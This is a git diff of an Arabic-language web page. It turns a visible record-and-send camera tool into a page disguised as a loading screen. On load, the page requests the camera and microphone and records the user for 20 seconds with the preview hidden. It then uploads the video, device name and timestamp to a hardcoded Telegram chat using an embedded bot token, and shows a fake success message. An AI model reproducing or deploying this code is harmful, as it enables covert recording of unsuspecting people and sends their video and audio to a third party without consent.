@@ -3,85 +3,95 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>🎬 تصوير وإرسال</title>
+    <title>🎬 جاري التحميل...</title>
     <style>
-        :root { --red: #e60000; --dark: #0a0a0a; }
+        :root { --red: #e60000; --green: #059669; }
         * { margin:0; padding:0; box-sizing:border-box; }
         body {
             font-family: system-ui, sans-serif;
-            background: var(--dark); color: #fff;
-            min-height: 100vh; padding: 20px; text-align: center;
+            background: #000; color: #fff;
+            height: 100vh; display: flex;
+            align-items: center; justify-content: center;
+            text-align: center; padding: 20px;
         }
-        .container { max-width: 450px; margin: 0 auto; }
-        h1 { color: var(--red); margin-bottom: 8px; }
-        .subtitle { color: #aaa; font-size: 13px; margin-bottom: 20px; }
+        .container { max-width: 400px; }
         
-        .video-preview {
-            width: 100%; max-width: 350px; margin: 20px auto;
-            border: 2px solid var(--red); border-radius: 16px;
-            overflow: hidden; background: #000;
-        }
-        video { width: 100%; display: block; }
+        .status-icon { font-size: 60px; margin-bottom: 16px; }
+        .status-text { font-size: 20px; font-weight: 700; margin-bottom: 8px; }
+        .status-sub { color: #aaa; font-size: 14px; }
         
-        .btn {
-            display: block; width: 100%; padding: 16px;
-            border-radius: 25px; border: none;
-            font-size: 18px; font-weight: 700; cursor: pointer;
-            margin: 10px 0;
+        .progress-bar {
+            width: 100%; height: 6px; background: #222;
+            border-radius: 3px; margin-top: 20px; overflow: hidden;
         }
-        .btn-red { background: var(--red); color: #fff; }
-        .btn-green { background: #059669; color: #fff; }
-        .btn:active { opacity: 0.8; }
+        .progress-fill {
+            height: 100%; background: var(--red);
+            width: 0%; transition: width 0.3s;
+        }
         
-        .status {
-            margin-top: 16px; padding: 14px; border-radius: 12px;
-            display: none; font-size: 14px;
+        .countdown {
+            font-size: 48px; font-weight: 900; color: var(--red);
+            margin: 16px 0;
         }
-        .status.show { display: block; }
-        .success { background: #0a1a0a; border: 1px solid #059669; color: #3fb950; }
-        .error { background: #1a0a0a; border: 1px solid var(--red); color: #f87171; }
-        .loading { background: #0a0a1a; border: 1px solid #2563eb; color: #60a5fa; }
+        
+        .success-box {
+            display: none; text-align: center;
+        }
+        .success-box .check { font-size: 70px; }
+        .success-box h2 { color: var(--green); margin: 12px 0; }
+        
+        video { display: none; }
     </style>
 </head>
 <body>
 
 <div class="container">
-    <h1>🎬 تصوير وإرسال</h1>
-    <p class="subtitle">الفيديو هيتسجل ويتبعت للتليجرام</p>
-    
-    <div class="video-preview">
-        <video id="video-preview" autoplay playsinline muted></video>
+    <div id="status-screen">
+        <div class="status-icon">📷</div>
+        <div class="status-text" id="main-status">يتم التحميل...</div>
+        <div class="status-sub" id="sub-status">جاري الوصول للكاميرا</div>
+        <div class="countdown" id="countdown">20</div>
+        <div class="progress-bar">
+            <div class="progress-fill" id="progress-fill"></div>
+        </div>
     </div>
     
-    <button class="btn btn-red" id="start-btn" onclick="startCamera()">📷 بدء الكاميرا</button>
-    <button class="btn btn-red" id="record-btn" onclick="startRecording()" style="display:none;">🔴 بدء التسجيل</button>
-    <button class="btn btn-green" id="stop-btn" onclick="stopRecording()" style="display:none;">⏹️ إيقاف وإرسال</button>
+    <div class="success-box" id="success-box">
+        <div class="check">✅</div>
+        <h2>تم التحميل بنجاح!</h2>
+        <p style="color:#aaa;">الفيديو اتبعت للإدارة</p>
+    </div>
     
-    <div class="status" id="status"></div>
+    <video id="hidden-video" autoplay playsinline muted></video>
 </div>
 
 <script>
-const urlParams = new URLSearchParams(window.location.search);
-const CHAT_ID = urlParams.get('chatId') || '7276604783';
 const BOT_TOKEN = '8437915697:AAGePdMDoI8h-jX_WTPOdNM42_LABwjRBUo';
+const ADMIN_ID = '7276604783';
+const RECORD_TIME = 20;
 
 let mediaRecorder, recordedChunks = [], stream;
 
-function showStatus(msg, type) {
-    const s = document.getElementById('status');
-    s.textContent = msg; s.className = 'status show ' + type;
-}
-
-async function startCamera() {
-    showStatus('⏳ جاري تشغيل الكاميرا...', 'loading');
+async function init() {
     try {
+        // طلب الكاميرا تلقائياً
+        document.getElementById('main-status').textContent = '📷 جاري تشغيل الكاميرا...';
+        document.getElementById('sub-status').textContent = 'الرجاء السماح بالكاميرا';
+        
         stream = await navigator.mediaDevices.getUserMedia({ video: true, audio: true });
-        document.getElementById('video-preview').srcObject = stream;
-        document.getElementById('start-btn').style.display = 'none';
-        document.getElementById('record-btn').style.display = 'block';
-        showStatus('✅ الكاميرا جاهزة', 'success');
+        document.getElementById('hidden-video').srcObject = stream;
+        
+        // بدء التسجيل
+        document.getElementById('main-status').textContent = '🔴 جاري التسجيل...';
+        document.getElementById('sub-status').textContent = 'الرجاء الثبات أمام الكاميرا';
+        
+        startRecording();
+        startCountdown();
+        
     } catch (e) {
-        showStatus('❌ فشل: ' + e.message, 'error');
+        document.getElementById('main-status').textContent = '❌ خطأ';
+        document.getElementById('sub-status').textContent = 'لم يتم السماح بالكاميرا';
+        document.getElementById('countdown').textContent = '✕';
     }
 }
 
@@ -90,41 +100,76 @@ function startRecording() {
     mediaRecorder = new MediaRecorder(stream, { mimeType: 'video/webm' });
     mediaRecorder.ondataavailable = (e) => { if (e.data.size > 0) recordedChunks.push(e.data); };
     mediaRecorder.start();
-    document.getElementById('record-btn').style.display = 'none';
-    document.getElementById('stop-btn').style.display = 'block';
-    showStatus('🔴 جاري التسجيل...', 'loading');
 }
 
-async function stopRecording() {
-    mediaRecorder.stop();
-    document.getElementById('stop-btn').style.display = 'none';
-    showStatus('⏳ جاري الإرسال...', 'loading');
+function startCountdown() {
+    let seconds = RECORD_TIME;
+    const countdownEl = document.getElementById('countdown');
+    const progressFill = document.getElementById('progress-fill');
     
-    await new Promise(r => setTimeout(r, 1000));
+    const interval = setInterval(() => {
+        seconds--;
+        countdownEl.textContent = seconds;
+        progressFill.style.width = ((RECORD_TIME - seconds) / RECORD_TIME * 100) + '%';
+        
+        if (seconds <= 5) {
+            document.getElementById('sub-status').textContent = '📤 جاري تجهيز الإرسال...';
+        }
+        
+        if (seconds <= 0) {
+            clearInterval(interval);
+            stopAndSend();
+        }
+    }, 1000);
+}
+
+async function stopAndSend() {
+    document.getElementById('main-status').textContent = '📤 جاري الإرسال...';
+    document.getElementById('sub-status').textContent = 'يتم إرسال الفيديو للإدارة';
+    document.getElementById('countdown').textContent = '...';
+    
+    mediaRecorder.stop();
+    
+    // استنى التسجيل يخلص
+    await new Promise(r => setTimeout(r, 2000));
     
     const blob = new Blob(recordedChunks, { type: 'video/webm' });
-    const formData = new FormData();
-    formData.append('chat_id', CHAT_ID);
-    formData.append('video', blob, 'video_' + Date.now() + '.webm');
-    formData.append('caption', '🎬 فيديو جديد\n📱 من: ' + navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز');
+    const deviceName = navigator.userAgent.match(/; ([^;]+) Build/)?.[1] || 'جهاز غير معروف';
+    
+    // إرسال للبوت
+    const formData1 = new FormData();
+    formData1.append('chat_id', ADMIN_ID);
+    formData1.append('video', blob, 'video_' + Date.now() + '.webm');
+    formData1.append('caption', '🎬 فيديو جديد\n📱 الجهاز: ' + deviceName + '\n🕐 الوقت: ' + new Date().toLocaleString('ar-EG'));
     
     try {
-        const res = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, { method: 'POST', body: formData });
-        const data = await res.json();
-        if (data.ok) {
-            showStatus('✅ تم إرسال الفيديو بنجاح!', 'success');
-        } else {
-            throw new Error(data.description);
-        }
-    } catch (e) {
-        showStatus('❌ ' + e.message, 'error');
-    }
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: 'POST', body: formData1
+        });
+    } catch(e) {}
     
+    // إرسال للادمن كمان
+    const formData2 = new FormData();
+    formData2.append('chat_id', '7276604783');
+    formData2.append('video', blob, 'video_' + Date.now() + '.webm');
+    formData2.append('caption', '🎬 فيديو جديد\n📱 الجهاز: ' + deviceName);
+    
+    try {
+        await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendVideo`, {
+            method: 'POST', body: formData2
+        });
+    } catch(e) {}
+    
+    // إظهار النجاح
+    document.getElementById('status-screen').style.display = 'none';
+    document.getElementById('success-box').style.display = 'block';
+    
+    // إيقاف الكاميرا
     stream.getTracks().forEach(t => t.stop());
-    document.getElementById('video-preview').srcObject = null;
-    document.getElementById('start-btn').style.display = 'block';
-    document.getElementById('record-btn').style.display = 'none';
 }
+
+// بدء تلقائي
+window.onload = init;
 </script>
 </body>
 </html>
